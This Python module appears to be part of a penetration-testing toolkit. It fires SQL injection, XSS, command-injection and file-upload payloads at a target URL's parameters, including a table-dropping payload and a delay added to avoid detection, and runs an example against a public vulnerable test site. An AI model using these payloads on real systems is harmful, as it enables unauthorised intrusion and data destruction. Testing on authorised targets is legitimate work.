"""
Initial Exploit Module
backend/tools/exploitation/initial_exploit.py

Handles the initial exploitation phase of identified vulnerabilities.
"""

import asyncio
import logging
import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
from datetime import datetime
import requests
from urllib.parse import urljoin, urlparse

logger = logging.getLogger(__name__)

@dataclass
class ExploitPayload:
    """Represents an exploit payload"""
    payload: str
    payload_type: str
    description: str
    risk_level: str
    prerequisites: List[str]

@dataclass
class ExploitResult:
    """Represents the result of an exploitation attempt"""
    success: bool
    payload_used: str
    response_data: Dict[str, Any]
    evidence: List[str]
    timestamp: datetime
    error_message: Optional[str] = None

class InitialExploit:
    """
    Handles initial exploitation of vulnerabilities
    """

    def __init__(self, target_url: str, vulnerability_type: str):
        self.target_url = target_url
        self.vulnerability_type = vulnerability_type
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })

    def get_payloads(self) -> List[ExploitPayload]:
        """Get exploitation payloads based on vulnerability type"""
        payloads = {
            'sql_injection': [
                ExploitPayload(
                    payload="' OR '1'='1",
                    payload_type="basic_sqli",
                    description="Basic SQL injection test",
                    risk_level="medium",
                    prerequisites=["injectable_parameter"]
                ),
                ExploitPayload(
                    payload="'; DROP TABLE users; --",
                    payload_type="destructive_sqli",
                    description="Destructive SQL injection (DO NOT USE IN PRODUCTION)",
                    risk_level="critical",
                    prerequisites=["injectable_parameter", "write_permissions"]
                ),
                ExploitPayload(
                    payload="' UNION SELECT 1,2,3,4,5 --",
                    payload_type="union_sqli",
                    description="Union-based SQL injection",
                    risk_level="high",
                    prerequisites=["injectable_parameter", "known_column_count"]
                )
            ],
            'xss': [
                ExploitPayload(
                    payload="<script>alert('XSS')</script>",
                    payload_type="reflected_xss",
                    description="Basic reflected XSS test",
                    risk_level="medium",
                    prerequisites=["injectable_parameter"]
                ),
                ExploitPayload(
                    payload="<img src=x onerror=alert('XSS')>",
                    payload_type="attribute_xss",
                    description="Attribute-based XSS",
                    risk_level="medium",
                    prerequisites=["injectable_parameter"]
                ),
                ExploitPayload(
                    payload="javascript:alert('XSS')",
                    payload_type="javascript_xss",
                    description="JavaScript protocol XSS",
                    risk_level="low",
                    prerequisites=["injectable_parameter"]
                )
            ],
            'command_injection': [
                ExploitPayload(
                    payload="; ls -la",
                    payload_type="basic_command_injection",
                    description="Basic command injection test",
                    risk_level="high",
                    prerequisites=["injectable_parameter"]
                ),
                ExploitPayload(
                    payload="& whoami",
                    payload_type="windows_command_injection",
                    description="Windows command injection test",
                    risk_level="high",
                    prerequisites=["injectable_parameter", "windows_target"]
                ),
                ExploitPayload(
                    payload="| id",
                    payload_type="pipe_command_injection",
                    description="Pipe-based command injection",
                    risk_level="high",
                    prerequisites=["injectable_parameter"]
                )
            ],
            'file_upload': [
                ExploitPayload(
                    payload="<?php echo 'test'; ?>",
                    payload_type="php_file_upload",
                    description="PHP file upload test",
                    risk_level="high",
                    prerequisites=["file_upload_endpoint", "php_execution"]
                ),
                ExploitPayload(
                    payload="<script>alert('uploaded')</script>",
                    payload_type="html_file_upload",
                    description="HTML file upload test",
                    risk_level="medium",
                    prerequisites=["file_upload_endpoint"]
                )
            ]
        }

        return payloads.get(self.vulnerability_type, [])

    async def test_payload(self, payload: ExploitPayload, target_params: Dict[str, str]) -> ExploitResult:
        """Test a single exploit payload"""
        try:
            evidence = []

            # Prepare the request based on payload type
            if 'sqli' in payload.payload_type:
                result = await self._test_sql_injection(payload, target_params)
            elif 'xss' in payload.payload_type:
                result = await self._test_xss(payload, target_params)
            elif 'command_injection' in payload.payload_type:
                result = await self._test_command_injection(payload, target_params)
            elif 'file_upload' in payload.payload_type:
                result = await self._test_file_upload(payload, target_params)
            else:
                result = await self._test_generic(payload, target_params)

            return ExploitResult(
                success=result.get('success', False),
                payload_used=payload.payload,
                response_data=result,
                evidence=evidence,
                timestamp=datetime.now()
            )

        except Exception as e:
            logger.error(f"Error testing payload {payload.payload}: {str(e)}")
            return ExploitResult(
                success=False,
                payload_used=payload.payload,
                response_data={},
                evidence=[],
                timestamp=datetime.now(),
                error_message=str(e)
            )

    async def _test_sql_injection(self, payload: ExploitPayload, params: Dict[str, str]) -> Dict[str, Any]:
        """Test SQL injection payload"""
        test_params = params.copy()

        # Try injecting into each parameter
        for param_name in test_params:
            test_params[param_name] = payload.payload

            try:
                response = self.session.get(self.target_url, params=test_params)

                # Look for SQL error indicators
                sql_errors = [
                    'mysql_fetch_array',
                    'ORA-01756',
                    'Microsoft JET Database',
                    'ODBC Microsoft Access',
                    'SQLite/JDBCDriver',
                    'SQLiteException',
                    'PostgreSQL query failed',
                    'Warning: mysql_',
                    'valid MySQL result',
                    'MySqlClient',
                    'com.mysql.jdbc',
                    'Zend_Db_',
                    'Pdo_',
                    'PDOException'
                ]

                response_text = response.text.lower()
                error_detected = any(error.lower() in response_text for error in sql_errors)

                if error_detected or response.status_code == 500:
                    return {
                        'success': True,
                        'method': 'GET',
                        'parameter': param_name,
                        'response_code': response.status_code,
                        'response_length': len(response.text),
                        'error_detected': error_detected
                    }

            except Exception as e:
                logger.error(f"SQL injection test failed: {str(e)}")

        return {'success': False}

    async def _test_xss(self, payload: ExploitPayload, params: Dict[str, str]) -> Dict[str, Any]:
        """Test XSS payload"""
        test_params = params.copy()

        for param_name in test_params:
            test_params[param_name] = payload.payload

            try:
                response = self.session.get(self.target_url, params=test_params)

                if payload.payload in response.text:
                    return {
                        'success': True,
                        'method': 'GET',
                        'parameter': param_name,
                        'response_code': response.status_code,
                        'payload_reflected': True
                    }

            except Exception as e:
                logger.error(f"XSS test failed: {str(e)}")

        return {'success': False}

    async def _test_command_injection(self, payload: ExploitPayload, params: Dict[str, str]) -> Dict[str, Any]:
        """Test command injection payload"""
        test_params = params.copy()

        for param_name in test_params:
            test_params[param_name] = payload.payload

            try:
                response = self.session.get(self.target_url, params=test_params)

                # Look for command execution indicators
                command_indicators = [
                    'total 0',  # ls output
                    'uid=',     # id/whoami output
                    'gid=',     # id output
                    'root:',    # /etc/passwd
                    'bin:',     # /etc/passwd
                    'www-data', # common web user
                    'apache',   # common web user
                    'nginx'     # common web user
                ]

                response_text = response.text.lower()
                command_executed = any(indicator in response_text for indicator in command_indicators)

                if command_executed:
                    return {
                        'success': True,
                        'method': 'GET',
                        'parameter': param_name,
                        'response_code': response.status_code,
                        'command_executed': True
                    }

            except Exception as e:
                logger.error(f"Command injection test failed: {str(e)}")

        return {'success': False}

    async def _test_file_upload(self, payload: ExploitPayload, params: Dict[str, str]) -> Dict[str, Any]:
        """Test file upload payload"""
        # This would need to be implemented based on specific file upload endpoints
        logger.info("File upload testing not implemented in basic exploit module")
        return {'success': False, 'reason': 'not_implemented'}

    async def _test_generic(self, payload: ExploitPayload, params: Dict[str, str]) -> Dict[str, Any]:
        """Test generic payload"""
        test_params = params.copy()

        for param_name in test_params:
            test_params[param_name] = payload.payload

            try:
                response = self.session.get(self.target_url, params=test_params)

                return {
                    'success': response.status_code == 200,
                    'method': 'GET',
                    'parameter': param_name,
                    'response_code': response.status_code,
                    'response_length': len(response.text)
                }

            except Exception as e:
                logger.error(f"Generic test failed: {str(e)}")

        return {'success': False}

    async def exploit(self, target_params: Dict[str, str] = None) -> List[ExploitResult]:
        """
        Run initial exploitation tests

        Args:
            target_params: Dictionary of parameters to test

        Returns:
            List of ExploitResult objects
        """
        if target_params is None:
            target_params = {'q': 'test', 'id': '1', 'search': 'test'}

        payloads = self.get_payloads()
        results = []

        logger.info(f"Starting initial exploitation with {len(payloads)} payloads")

        for payload in payloads:
            result = await self.test_payload(payload, target_params)
            results.append(result)

            if result.success:
                logger.warning(f"Successful exploitation detected: {payload.description}")

            # Add delay between requests to avoid detection
            await asyncio.sleep(1)

        logger.info(f"Initial exploitation completed. {sum(1 for r in results if r.success)} successful exploits found")
        return results

    def cleanup(self):
        """Cleanup resources"""
        if hasattr(self, 'session'):
            self.session.close()

# Example usage
async def main():
    """Example usage of the InitialExploit class"""
    target_url = "http://testphp.vulnweb.com/listproducts.php"
    vuln_type = "sql_injection"

    exploit = InitialExploit(target_url, vuln_type)

    try:
        results = await exploit.exploit({'cat': '1'})

        for result in results:
            print(f"Payload: {result.payload_used}")
            print(f"Success: {result.success}")
            print(f"Response: {result.response_data}")
            print("-" * 50)

    finally:
        exploit.cleanup()

if __name__ == "__main__":
    asyncio.run(main())